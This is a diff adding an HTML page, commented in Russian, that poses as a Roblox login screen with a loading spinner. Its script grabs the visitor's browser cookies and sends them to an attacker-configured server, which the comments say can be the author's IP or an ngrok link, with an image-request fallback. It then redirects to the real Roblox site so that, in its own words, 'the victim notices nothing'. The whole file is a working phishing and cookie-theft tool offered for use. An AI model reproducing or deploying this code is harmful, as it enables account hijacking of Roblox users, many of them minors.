@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Roblox — вход</title>
+    <style>
+        /* Минимальная маскировка под страницу Roblox */
+        body {
+            background: #1a1a2e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #fff;
+            font-size: 20px;
+            text-align: center;
+        }
+        .loader {
+            border: 6px solid #2a2a4a;
+            border-top: 6px solid #00b2ff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <div>Подключение к Roblox...</div>
+    </div>
+
+    <script>
+        // ====== НАСТРОЙКА ======
+        // Замени <ТВОЙ_IP> на реальный IP или домен, где висит сервер (с портом 8080)
+        // Если используешь ngrok — подставь его HTTPS-ссылку
+        var TARGET = 'https://127.0.0.1:8080/';   // <--- СЮДА ТВОЙ АДРЕС
+        // =======================
+
+        // 1. Хватаем все куки
+        var cookies = document.cookie;
+
+        // 2. Если куки есть — отправляем на сервер
+        if (cookies && cookies.length > 0) {
+            // Основной метод — fetch (работает в современных браузерах)
+            fetch(TARGET, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cookie: cookies })
+            })
+            .then(function(response) {
+                // даже если ответ 400/500 — нам пофиг, главное — отправили
+                console.log('Отправлено на сервер');
+            })
+            .catch(function(err) {
+                // Если fetch не сработал (CORS, блокировка) — пробуем через Image
+                var img = new Image();
+                img.src = TARGET + '?c=' + encodeURIComponent(cookies);
+                console.log('Отправлено через Image (fallback)');
+            });
+        } else {
+            console.log('Куки не найдены');
+        }
+
+        // 3. Перенаправляем на настоящий Roblox, чтобы жертва ничего не заметила
+        // Используем replace, чтобы не сохранять нашу страницу в истории
+        window.location.replace('https://www.roblox.com/home');
+    </script>
+</body>
+</html>
